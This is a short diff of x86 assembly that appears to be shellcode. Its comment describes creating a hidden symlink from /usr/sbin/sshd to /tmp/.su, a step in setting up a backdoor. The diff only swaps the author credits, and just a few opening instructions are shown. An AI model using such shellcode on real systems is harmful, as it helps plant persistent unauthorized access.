@@ -4,8 +4,7 @@ section .text
 _start:
 	
 	  ; symlink("/usr/sbin/sshd", "/tmp/.su")
-    ; by @lizard2h
-    ; thanks to @k3nsh1n
+    ; by @bod4k
 
 	xor eax, eax
 	xor ebx, ebx
